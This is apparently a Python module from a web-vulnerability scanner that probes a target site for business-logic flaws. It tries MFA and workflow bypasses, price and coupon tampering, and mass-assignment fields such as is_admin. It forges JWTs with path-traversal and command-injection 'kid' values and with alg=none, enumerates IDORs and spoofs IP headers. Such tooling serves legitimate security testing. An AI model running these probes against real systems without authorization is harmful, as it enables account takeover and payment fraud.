import re, json, copy, time, hashlib, urllib.parse
from typing import Optional, Dict, List, Tuple, Callable
from collections import Counter

from tools.log_utils import get_logger
from tools.http_client import build_url

logger = get_logger("biz_logic_scanner")


# ---------------------------------------------------------------------------
# 2FA / MFA Bypass
# ---------------------------------------------------------------------------

MFA_BYPASS_TECHNIQUES = [
    {
        "name": "backup_code_bruteforce",
        "desc": "Try common backup codes (000000-999999, 123456, etc)",
    },
    {
        "name": "null_or_negative_otp",
        "desc": "Send empty or negative OTP values",
    },
    {
        "name": "repeat_previous_otp",
        "desc": "Reuse previously valid OTP code",
    },
    {
        "name": "skip_2fa_param",
        "desc": "Remove or tamper 2fa_required/skip_2fa params",
    },
    {
        "name": "cookie_tamper_2fa",
        "desc": "Tamper 2fa_complete or mfa_done cookies",
    },
    {
        "name": "direct_dashboard_access",
        "desc": "Try accessing post-auth pages directly without 2FA",
    },
    {
        "name": "otp_email_manipulation",
        "desc": "Try changing the email/phone where OTP is sent",
    },
    {
        "name": "resend_otp_endless",
        "desc": "Check if resend OTP endpoint has rate limiting",
    },
    {
        "name": "otp_broadcast_return",
        "desc": "Check if OTP is returned in response body",
    },
]

MFA_COMMON_OTPS = [
    "000000", "111111", "222222", "123456", "123123",
    "654321", "999999", "000001", "012345", "111111",
]


def check_mfa_bypass(url: str, sess: "requests.Session",
                     timeout: float, target_session: Optional[Dict] = None) -> Dict:
    result = {"vulnerable": False, "findings": [], "techniques_tested": []}
    base = url.rstrip("/")

    paths_to_test = [
        "/dashboard", "/profile", "/account", "/admin",
        "/api/user/me", "/api/profile", "/home",
    ]

    for path in paths_to_test:
        try:
            r = sess.get(f"{base}{path}", timeout=timeout, verify=False,
                         allow_redirects=False)
            if r.status_code in (200, 201, 204) and r.status_code not in (302, 401, 403):
                result["vulnerable"] = True
                result["findings"].append({
                    "technique": "direct_dashboard_access",
                    "detail": f"Direct access to {path} returned {r.status_code} without 2FA",
                    "url": f"{base}{path}",
                })
        except Exception:
            pass

    if result["vulnerable"]:
        return result

    common_params_tamper = [
        {"2fa_required": "false"},
        {"2fa_required": "0"},
        {"skip_2fa": "true"},
        {"mfa_required": "false"},
        {"otp_verified": "true"},
        {"two_factor": "bypass"},
    ]
    for params in common_params_tamper:
        for path in paths_to_test[:3]:
            try:
                sep = "&" if "?" in path else "?"
                param_str = "&".join(f"{k}={v}" for k, v in params.items())
                r = sess.get(f"{base}{path}{sep}{param_str}",
                             timeout=timeout, verify=False, allow_redirects=False)
                if r.status_code in (200, 201, 204):
                    result["vulnerable"] = True
                    result["findings"].append({
                        "technique": "skip_2fa_param",
                        "detail": f"2FA bypassed with params {params} on {path}",
                        "params": params,
                    })
            except Exception:
                pass
        if result["vulnerable"]:
            break

    return result


# ---------------------------------------------------------------------------
# Price Manipulation
# ---------------------------------------------------------------------------

PRICE_FIELD_PATTERNS = [
    "price", "amount", "total", "cost", "charge", "fee",
    "payment", "discount", "subtotal", "value", "donation",
    "quantity", "qty", "count",
]


def check_price_manipulation(url: str, param: str, sess: "requests.Session",
                              timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}
    param_lower = param.lower()

    if not any(k in param_lower for k in PRICE_FIELD_PATTERNS):
        return result

    tamper_values = [
        ("0", "zero price"),
        ("-1", "negative price"),
        ("1", "minimal positive"),
        ("99999999", "very large number"),
        ("0.01", "minimal decimal"),
        ("-9999", "large negative"),
        ("true", "boolean true"),
        ("null", "null value"),
        ('{"__type": "Pointer", "className": "Product", "objectId": ""}', "parse server injection"),
    ]

    baseline = None
    baseline_text = ""
    try:
        baseline = sess.get(build_url(url, param, "1"), timeout=timeout, verify=False)
        baseline_text = baseline.text
    except Exception:
        pass

    def _price_differs(body: str) -> bool:
        patterns = [
            r'["\']price["\']\s*:\s*(\d+(?:\.\d+)?)',
            r'["\']amount["\']\s*:\s*(\d+(?:\.\d+)?)',
            r'["\']total["\']\s*:\s*(\d+(?:\.\d+)?)',
            r'["\']cost["\']\s*:\s*(\d+(?:\.\d+)?)',
            r'\$(\d+(?:\.\d+)?)',
            r'(\d+(?:\.\d+)?)\s*元',
        ]
        for pat in patterns:
            m = re.search(pat, body)
            if m:
                if baseline_text:
                    bm = re.search(pat, baseline_text)
                    if bm and bm.group(1) != m.group(1):
                        return True
                elif m.group(1) not in ("0", "1"):
                    return True
        return False

    for val, label in tamper_values:
        try:
            r = sess.get(build_url(url, param, val), timeout=timeout, verify=False)
            if baseline and r.status_code == baseline.status_code:
                if _price_differs(r.text):
                    result["vulnerable"] = True
                    result["findings"].append({
                        "technique": "price_tamper",
                        "detail": f"Price param '{param}={val}' ({label}) affected response, status={r.status_code}",
                    })
        except Exception:
            pass

    return result


# ---------------------------------------------------------------------------
# Mass Assignment
# ---------------------------------------------------------------------------

COMMON_MASS_ASSIGN_FIELDS = [
    "role", "is_admin", "admin", "group", "permissions",
    "access_level", "user_type", "account_type", "membership",
    "verified", "is_verified", "email_verified", "active",
    "is_active", "enabled", "disabled", "approved",
    "status", "state", "subscription", "tier",
    "credit", "balance", "points",
    "admin_note", "__proto__", "constructor",
]


def check_mass_assignment(url: str, method: str, sess: "requests.Session",
                          timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}

    baseline_body = ""
    try:
        clean = {"username": "test_user", "email": "test@test.com"}
        if method.upper() == "POST":
            br = sess.post(url, json=clean, timeout=timeout, verify=False)
        elif method.upper() == "PUT":
            br = sess.put(url, json=clean, timeout=timeout, verify=False)
        elif method.upper() == "PATCH":
            br = sess.patch(url, json=clean, timeout=timeout, verify=False)
        else:
            br = sess.post(url, json=clean, timeout=timeout, verify=False)
        baseline_body = br.text
        baseline_status = br.status_code
    except Exception:
        baseline_status = 200

    for field in COMMON_MASS_ASSIGN_FIELDS:
        data = {
            "username": "test_user",
            "email": "test@test.com",
            field: "admin",
        }
        try:
            if method.upper() == "POST":
                r = sess.post(url, json=data, timeout=timeout, verify=False)
            elif method.upper() == "PUT":
                r = sess.put(url, json=data, timeout=timeout, verify=False)
            elif method.upper() == "PATCH":
                r = sess.patch(url, json=data, timeout=timeout, verify=False)
            else:
                r = sess.post(url, json=data, timeout=timeout, verify=False)

            body_diff = r.text != baseline_body
            status_diff = r.status_code != baseline_status
            if body_diff or status_diff:
                result["vulnerable"] = True
                result["findings"].append({
                    "technique": "mass_assignment",
                    "detail": f"Field '{field}' changed response (status {baseline_status}->{r.status_code}, body changed={body_diff})",
                    "field": field,
                })
        except Exception:
            pass

    return result


# ---------------------------------------------------------------------------
# OAuth / SSO Logic Flaw Detection
# ---------------------------------------------------------------------------

OAUTH_REDIRECT_PATTERNS = [
    r'redirect_uri=([^&\s"\']+)',
    r'redirectUrl=([^&\s"\']+)',
    r'redirect_url=([^&\s"\']+)',
    r'callback=([^&\s"\']+)',
    r'continue=([^&\s"\']+)',
    r'return_to=([^&\s"\']+)',
    r'next=([^&\s"\']+)',
    r'state=([^&\s"\']+)',
]

OAUTH_SSO_FLAW_CHECKS = [
    {
        "name": "open_redirect_in_oauth",
        "desc": "OAuth/SAML redirect_uri accepts arbitrary domains",
    },
    {
        "name": "state_param_missing_or_static",
        "desc": "CSRF protection via state param is missing or predictable",
    },
    {
        "name": "token_in_url_leak",
        "desc": "Access/ID tokens leaked in redirect URL via referer header",
    },
    {
        "name": "saml_assertion_reuse",
        "desc": "SAML assertion can be replayed across accounts",
    },
]


def check_oauth_logic(url: str, sess: "requests.Session",
                      timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}

    try:
        r = sess.get(url, timeout=timeout, verify=False, allow_redirects=True)
        for pat in OAUTH_REDIRECT_PATTERNS:
            matches = re.findall(pat, r.text, re.IGNORECASE)
            for redirect_url in matches:
                redirect_url = urllib.parse.unquote(redirect_url).rstrip("/")
                if not redirect_url.startswith(("http://", "https://")):
                    continue
                parsed = urllib.parse.urlparse(redirect_url)
                target_domain = parsed.netloc.lower()
                if target_domain and target_domain != sess.get(url, timeout=timeout, verify=False).url:
                    result["vulnerable"] = True
                    result["findings"].append({
                        "technique": "open_redirect_in_oauth",
                        "detail": f"redirect_uri allows external domain: {redirect_url[:80]}",
                    })
                    break
    except Exception:
        pass

    try:
        r = sess.get(url, timeout=timeout, verify=False, allow_redirects=False)
        location = r.headers.get("Location", "")
        if location:
            parsed_loc = urllib.parse.urlparse(location)
            qs = urllib.parse.parse_qs(parsed_loc.query)
            state_vals = qs.get("state", [])
            for sv in state_vals:
                if len(sv) < 16:
                    result["vulnerable"] = True
                    result["findings"].append({
                        "technique": "state_param_missing_or_static",
                        "detail": f"OAuth state parameter is too short or missing: '{sv}'",
                    })
                break
    except Exception:
        pass

    return result


# ---------------------------------------------------------------------------
# JWT Algorithm Confusion / KID Injection
# ---------------------------------------------------------------------------

def check_jwt_kid_injection(sess: "requests.Session", url: str,
                             token: Optional[str] = None,
                             timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "findings": []}

    if not token:
        return result

    import base64, json as _json

    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    kid_payloads = [
        {"kid": "../../../../../etc/passwd", "alg": "HS256"},
        {"kid": "/proc/self/environ", "alg": "HS256"},
        {"kid": "/dev/null", "alg": "HS256"},
        {"kid": "a;echo test;", "alg": "HS256"},
        {"kid": "00000000-0000-0000-0000-000000000000", "alg": "HS256"},
    ]

    for kid_header in kid_payloads:
        try:
            hdr_b64 = b64url_encode(_json.dumps(kid_header).encode())
            pld_b64 = b64url_encode(_json.dumps({"sub": "admin", "role": "admin"}).encode())
            sig = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
            forged = f"{hdr_b64}.{pld_b64}.{b64url_encode(sig.encode())}"
            r = sess.get(url, headers={"Authorization": f"Bearer {forged}"},
                         timeout=timeout, verify=False)
            if r.status_code in (200, 201, 204):
                result["vulnerable"] = True
                result["findings"].append({
                    "technique": "jwt_kid_injection",
                    "detail": f"KID injection with {kid_header['kid']} accepted",
                    "header": kid_header,
                })
        except Exception:
            pass

    none_header = {"alg": "none"}
    try:
        hdr_b64 = b64url_encode(_json.dumps(none_header).encode())
        pld_b64 = b64url_encode(_json.dumps({"sub": "admin", "role": "admin"}).encode())
        forged = f"{hdr_b64}.{pld_b64}."
        r = sess.get(url, headers={"Authorization": f"Bearer {forged}"},
                     timeout=timeout, verify=False)
        if r.status_code in (200, 201, 204):
            result["vulnerable"] = True
            result["findings"].append({
                "technique": "jwt_none_alg",
                "detail": "JWT alg=none accepted (empty signature)",
                "header": none_header,
            })
    except Exception:
        pass

    return result


# ---------------------------------------------------------------------------
# Coupon / Promo Logic Abuse
# ---------------------------------------------------------------------------

COUPON_TAMPER_VECTORS = [
    {"coupon": "admin", "discount": "100"},
    {"coupon": "PERCENT100", "discount": "100"},
    {"coupon": "FREE", "discount": "100"},
    {"coupon_code": "XXXXXX", "amount": "0"},
    {"promo": "test", "percentage": "100"},
    {"promo_code": "admin", "value": "-100"},
    {"code": "special", "discount": "999999"},
]


def check_coupon_abuse(url: str, sess: "requests.Session",
                        timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}
    base = url.rstrip("/")

    coupon_endpoints = [
        "/api/coupon/redeem", "/api/promo/apply",
        "/api/v1/coupon/apply", "/api/coupon",
        "/api/promo", "/coupon/redeem", "/checkout/coupon",
    ]

    for endpoint in coupon_endpoints:
        for params in COUPON_TAMPER_VECTORS:
            try:
                r = sess.post(f"{base}{endpoint}", json=params,
                              timeout=timeout, verify=False)
                body_lower = r.text.lower()
                if r.status_code in (200, 201, 204):
                    success_keywords = ["applied", "success", "redeemed",
                                         "discount", "coupon applied"]
                    if any(kw in body_lower for kw in success_keywords):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "technique": "coupon_abuse",
                            "detail": f"Coupon {params} accepted at {endpoint} (status={r.status_code})",
                            "endpoint": endpoint,
                            "params": params,
                        })
            except Exception:
                pass
        if result["vulnerable"]:
            break

    return result


# ---------------------------------------------------------------------------
# Workflow / State Machine Bypass
# ---------------------------------------------------------------------------

WORKFLOW_BYPASS_TECHNIQUES = [
    {
        "name": "skip_step",
        "desc": "Skip required workflow steps by directly accessing later steps",
    },
    {
        "name": "reorder_steps",
        "desc": "Execute workflow steps in an unexpected order",
    },
    {
        "name": "repeat_step",
        "desc": "Repeat a step that should only execute once",
    },
    {
        "name": "parallel_execution",
        "desc": "Execute two conflicting steps in parallel",
    },
    {
        "name": "tamper_step_token",
        "desc": "Modify step completion token to mark uncompleted steps as done",
    },
]


def check_workflow_bypass(url: str, sess: "requests.Session",
                           timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}

    common_flow_steps = {
        "/checkout/cart": ["/checkout/shipping", "/checkout/payment", "/checkout/confirm"],
        "/onboarding/step1": ["/onboarding/step2", "/onboarding/step3", "/onboarding/done"],
        "/signup/account": ["/signup/profile", "/signup/verify", "/signup/done"],
        "/order/create": ["/order/pay", "/order/confirm", "/order/done"],
        "/registration/basic": ["/registration/details", "/registration/confirm", "/registration/complete"],
    }

    for first_step, later_steps in common_flow_steps.items():
        if first_step not in url and not any(s in url for s in later_steps):
            continue
        for skip_to in later_steps:
            target_url = f"{url.rstrip('/')}{skip_to}"
            try:
                r = sess.get(target_url, timeout=timeout, verify=False,
                             allow_redirects=False)
                if r.status_code in (200, 201, 204):
                    r2 = sess.get(f"{url.rstrip('/')}{first_step}",
                                  timeout=timeout, verify=False)
                    if r2.status_code not in (302, 401, 403):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "technique": "skip_step",
                            "detail": f"Direct access to mid-flow step {skip_to} returned {r.status_code}",
                            "url": target_url,
                        })
            except Exception:
                pass
            if result["vulnerable"]:
                break
        if result["vulnerable"]:
            break

    return result


# ---------------------------------------------------------------------------
# IDOR Chain Detection (Multi-step object reference)
# ---------------------------------------------------------------------------

def check_idor_chain(url: str, sess: "requests.Session",
                     timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}

    idor_uuid_patterns = [
        r'/user/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})',
        r'/order/(\d+)',
        r'/account/(\d+)',
        r'/api/v1/users/(\d+)',
        r'/document/([a-f0-9]+)',
    ]

    try:
        r = sess.get(url, timeout=timeout, verify=False)
        for pat in idor_uuid_patterns:
            matches = re.findall(pat, r.text, re.IGNORECASE)
            for match in matches[:5]:
                test_urls = [
                    re.sub(r'(/user/|/order/|/account/)' + re.escape(str(match)),
                           r'\g<1>' + str(int(match) + 1) if match.isdigit() else match + "x",
                           url),
                ]
                for tu in test_urls:
                    try:
                        r2 = sess.get(tu, timeout=timeout, verify=False)
                        if r2.status_code in (200, 201) and len(r2.text) > 50:
                            result["vulnerable"] = True
                            result["findings"].append({
                                "technique": "idor_chain",
                                "detail": f"Object ID enumeration possible: {match} -> seq+1 also accessible",
                                "original": match,
                                "test_url": tu[:80],
                            })
                    except Exception:
                        pass
    except Exception:
        pass

    return result


# ---------------------------------------------------------------------------
# Rate Limit Bypass Detection
# ---------------------------------------------------------------------------

def check_rate_limit_bypass(url: str, sess: "requests.Session",
                            timeout: float) -> Dict:
    result = {"vulnerable": False, "findings": []}
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Cluster-Client-IP": "127.0.0.1"},
        {"X-Forwarded-For": "192.168.1.1"},
    ]

    for headers in bypass_headers:
        codes = []
        for _ in range(5):
            try:
                r = sess.get(url, headers=headers, timeout=timeout, verify=False)
                codes.append(r.status_code)
            except Exception:
                pass
        unique_codes = set(codes)
        if 200 in unique_codes and 429 not in unique_codes:
            continue
        if 429 in unique_codes:
            codes_without_bypass = []
            for _ in range(3):
                try:
                    r = sess.get(url, timeout=timeout, verify=False)
                    codes_without_bypass.append(r.status_code)
                except Exception:
                    pass
            if 429 in codes_without_bypass:
                result["vulnerable"] = True
                result["findings"].append({
                    "technique": "rate_limit_bypass",
                    "detail": f"Rate limit bypass using headers {headers}",
                    "headers": headers,
                })

    return result


# ---------------------------------------------------------------------------
# Main check
# ---------------------------------------------------------------------------

CHECKS_REGISTRY: List[Dict] = [
    {"name": "mfa_bypass", "fn": check_mfa_bypass, "desc": "2FA/MFA bypass techniques"},
    {"name": "price_manipulation", "fn": check_price_manipulation, "desc": "Price/amount tampering"},
    {"name": "mass_assignment", "fn": check_mass_assignment, "desc": "Mass assignment via extra fields"},
    {"name": "oauth_logic", "fn": check_oauth_logic, "desc": "OAuth/SSO logic flaws"},
    {"name": "jwt_kid_injection", "fn": check_jwt_kid_injection, "desc": "JWT KID injection / alg confusion"},
    {"name": "coupon_abuse", "fn": check_coupon_abuse, "desc": "Coupon/promo code abuse"},
    {"name": "workflow_bypass", "fn": check_workflow_bypass, "desc": "Workflow/state machine bypass"},
    {"name": "idor_chain", "fn": check_idor_chain, "desc": "IDOR chain / object enumeration"},
    {"name": "rate_limit_bypass", "fn": check_rate_limit_bypass, "desc": "Rate limit bypass via headers"},
]


def check(url: str, param: str = None, sess: Optional["requests.Session"] = None,
          timeout: float = 10.0) -> Dict:
    import requests
    if sess is None:
        sess = requests.Session()
    result = {
        "vulnerable": False,
        "findings": [],
        "checks_run": [],
    }

    for check_def in CHECKS_REGISTRY:
        try:
            if check_def["name"] == "price_manipulation" and param:
                r = check_def["fn"](url, param, sess, timeout)
            elif check_def["name"] == "mass_assignment":
                method = "POST"
                r = check_def["fn"](url, method, sess, timeout)
            elif check_def["name"] == "jwt_kid_injection":
                from tools.jwt_detector import JWT_REGEX as _JWT_REGEX
                token = None
                try:
                    resp = sess.get(url, timeout=timeout, verify=False)
                    m = re.search(_JWT_REGEX, resp.text)
                    if m:
                        token = m.group(0)
                except Exception:
                    pass
                r = check_def["fn"](sess, url, token, timeout)
            elif check_def["name"] in ("mfa_bypass", "oauth_logic", "coupon_abuse",
                                        "workflow_bypass", "idor_chain", "rate_limit_bypass"):
                r = check_def["fn"](url, sess, timeout)
            elif check_def["name"] in ("price_manipulation",) and not param:
                continue
            else:
                continue

            if r.get("vulnerable"):
                result["vulnerable"] = True
                result["findings"].extend(r.get("findings", []))
            result["checks_run"].append(check_def["name"])
        except Exception as e:
            logger.debug("biz_logic %s: %s", check_def["name"], e)
            result["checks_run"].append(f"{check_def['name']}(error)")

    return result
